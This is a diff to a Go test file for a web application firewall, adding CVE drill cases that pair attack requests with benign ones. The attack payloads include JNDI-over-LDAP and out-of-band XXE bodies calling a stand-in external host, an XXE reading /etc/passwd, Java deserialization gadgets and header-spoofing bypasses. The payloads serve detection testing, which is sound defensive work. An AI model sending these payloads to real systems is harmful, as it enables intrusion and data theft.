@@ -3,6 +3,7 @@
 package gwaf_test
 
 import (
+	"encoding/base64"
 	"flag"
 	"fmt"
 	"os"
@@ -140,8 +141,7 @@ var cveDrill = []cveCase{
 		attack: drillReq{method: "POST", target: "/moveitisapi/moveitisapi.dll?action=m2",
 			headers: [][2]string{{"X-siLock-Transaction", "folder_add_by_path"}, {"X-siLock-SessVar0", "MyUsername: Guest"}}},
 		benign: drillReq{method: "GET", target: "/human.aspx"},
-		want:   covGap,
-		note:   "signatures.IDMOVEitHeader keys on X-siis-session-id; the session-variable injection the public exploit sends in X-siLock-* headers passes.",
+		want:   covNamed,
 	},
 	{
 		cve: "CVE-2025-29927", name: "Next.js middleware bypass header",
@@ -150,6 +150,95 @@ var cveDrill = []cveCase{
 		benign: drillReq{method: "GET", target: "/admin"},
 		want:   covEmbedder,
 		note:   "The header is harmless text; the defect is a framework trusting it from a client. The edge must strip it (gateon: framework-internal headers are stripped at the entrypoint).",
+	},
+	// ---- 2026-11-28 round: KEV additions and exploited CVEs, 2026-10-20..11-28.
+	{
+		cve: "CVE-2026-35273", name: "PeopleSoft PSEMHUB raw Java object stream behind an encoded path",
+		attack: drillReq{method: "POST", target: "/%50SEMHUB/hub", ct: "application/octet-stream", body: string(javaStream)},
+		benign: drillReq{method: "POST", target: "/PSEMHUB/hub", ct: "application/octet-stream", body: "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10"},
+		want:   covStructural,
+	},
+	{
+		cve: "CVE-2026-131914", name: "Idunno.AntiCsrf ObjectStateFormatter gadget in the CSRF form field",
+		attack: drillReq{method: "POST", target: "/Default.aspx", ct: "application/x-www-form-urlencoded",
+			headers: [][2]string{{"Cookie", "__CSRFCOOKIE=1"}},
+			body:    formBody("__CSRFTOKEN", viewStateGadget())},
+		benign: drillReq{method: "POST", target: "/Default.aspx", ct: "application/x-www-form-urlencoded",
+			body: formBody("__VIEWSTATE", viewStateBenign(), "__VIEWSTATEGENERATOR", "CA0B0334")},
+		want: covStructural,
+	},
+	{
+		cve: "CVE-2025-42884", name: "SAP NetWeaver Portal JNDI environment in a SOAP list call",
+		attack: drillReq{method: "POST", target: "/DefaultService_PcmSi/", ct: "text/xml; charset=utf-8",
+			body: `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ns:list>` +
+				`<ns:EnvironmentElement><ns:name>java.naming.factory.initial</ns:name><ns:value>com.sun.jndi.ldap.LdapCtxFactory</ns:value></ns:EnvironmentElement>` +
+				`<ns:EnvironmentElement><ns:name>java.naming.provider.url</ns:name><ns:value>ldap://203.0.113.7:1389/a</ns:value></ns:EnvironmentElement>` +
+				`</ns:list></soapenv:Body></soapenv:Envelope>`},
+		benign: drillReq{method: "POST", target: "/DefaultService_PcmSi/", ct: "text/xml; charset=utf-8",
+			body: `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ns:list>` +
+				`<ns:EnvironmentElement><ns:name>locale</ns:name><ns:value>en_US</ns:value></ns:EnvironmentElement></ns:list></soapenv:Body></soapenv:Envelope>`},
+		want: covStructural,
+	},
+	{
+		cve: "CVE-2026-129448", name: "Apache Roller XML-RPC serializable extension type",
+		attack: drillReq{method: "POST", target: "/roller-services/xmlrpc", ct: "text/xml",
+			body: `<?xml version="1.0"?><methodCall><methodName>metaWeblog.getPost</methodName><params><param><value>` +
+				`<ex:serializable xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions">` +
+				base64.StdEncoding.EncodeToString(javaStream) + `</ex:serializable></value></param></params></methodCall>`},
+		benign: drillReq{method: "POST", target: "/roller-services/xmlrpc", ct: "text/xml",
+			body: `<?xml version="1.0"?><methodCall><methodName>metaWeblog.getPost</methodName><params><param><value><string>42</string></value></param></params></methodCall>`},
+		want: covStructural,
+	},
+	{
+		cve: "CVE-2026-20320", name: "Cisco BroadWorks OCI-P blind out-of-band XXE",
+		attack: drillReq{method: "POST", target: "/webservice/services/ProvisioningService", ct: "text/xml",
+			body: `<?xml version="1.0"?><!DOCTYPE m [<!ENTITY % p SYSTEM "http://203.0.113.7/x.dtd"> %p;]><BroadsoftDocument protocol="OCI"><sessionId>a</sessionId></BroadsoftDocument>`},
+		benign: drillReq{method: "POST", target: "/webservice/services/ProvisioningService", ct: "text/xml",
+			body: `<?xml version="1.0"?><BroadsoftDocument protocol="OCI"><sessionId>a</sessionId></BroadsoftDocument>`},
+		want: covStructural,
+	},
+	{
+		cve: "CVE-2026-120705", name: "GeoServer WFS stored query external entity",
+		attack: drillReq{method: "POST", target: "/geoserver/wfs", ct: "application/xml",
+			body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><wfs:GetFeature service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0"><wfs:StoredQuery id="&x;"/></wfs:GetFeature>`},
+		benign: drillReq{method: "POST", target: "/geoserver/wfs", ct: "application/xml",
+			body: `<?xml version="1.0"?><wfs:GetFeature service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0"><wfs:StoredQuery id="urn:ogc:def:query:OGC-WFS::GetFeatureById"/></wfs:GetFeature>`},
+		want: covStructural,
+	},
+	{
+		cve: "CVE-2026-129243", name: "GeoServer prefixed service name past the service-security check",
+		attack: drillReq{method: "GET", target: "/geoserver/ows?service=x/WFS&version=2.0.0&request=CreateStoredQuery"},
+		benign: drillReq{method: "GET", target: "/geoserver/ows?service=WFS&version=2.0.0&request=GetCapabilities"},
+		want:   covNamed,
+	},
+	{
+		cve: "CVE-2026-102895", name: "GPUStack loopback identity from a client header",
+		attack: drillReq{method: "GET", target: "/v2/users", headers: [][2]string{{"X-GPUStack-Real-IP", "127.0.0.1"}}},
+		benign: drillReq{method: "GET", target: "/v2/users"},
+		want:   covEmbedder,
+		note:   "The header is a well-formed address; the defect is GPUStack believing a client about where the client is. The edge must strip it. gateon strips its framework-internal list and resolves the client address itself, but forwards this vendor header today.",
+	},
+	{
+		cve: "CVE-2026-132165", name: "Drupal reinstall through install.php",
+		attack: drillReq{method: "POST", target: "/core/install.php?rewrite=ok&langcode=en&profile=standard",
+			ct: "application/x-www-form-urlencoded", body: "form_id=install_settings_form&driver=sqlite"},
+		benign: drillReq{method: "GET", target: "/node/1"},
+		want:   covEmbedder,
+		note:   "The request is the installer's own form, byte for byte; whether a deployed site may still be installed is policy. Deny /core/install.php at the edge on a site that is already installed.",
+	},
+	{
+		cve: "CVE-2026-119618", name: "Apache mod_http2 header-assignment race",
+		attack: drillReq{method: "GET", target: "/"},
+		benign: drillReq{method: "GET", target: "/"},
+		want:   covEmbedder,
+		note:   "A race in the origin's HTTP/2 frame handling; no request content carries it. A gateway that terminates HTTP/2 and re-originates the request (gateon does) keeps client frames from reaching the origin.",
+	},
+	{
+		cve: "CVE-2026-123007", name: "NGINX HTTP/2 flow-control window underflow",
+		attack: drillReq{method: "GET", target: "/"},
+		benign: drillReq{method: "GET", target: "/"},
+		want:   covEmbedder,
+		note:   "SETTINGS, WINDOW_UPDATE and stream cancellation, all below the request; no request content carries it. A gateway that terminates HTTP/2 and re-originates the request (gateon does) keeps client frames from reaching the origin.",
 	},
 	{
 		cve: "CVE-2026-98432", name: "Kernel TCP handshake use-after-free via SYN IP options",
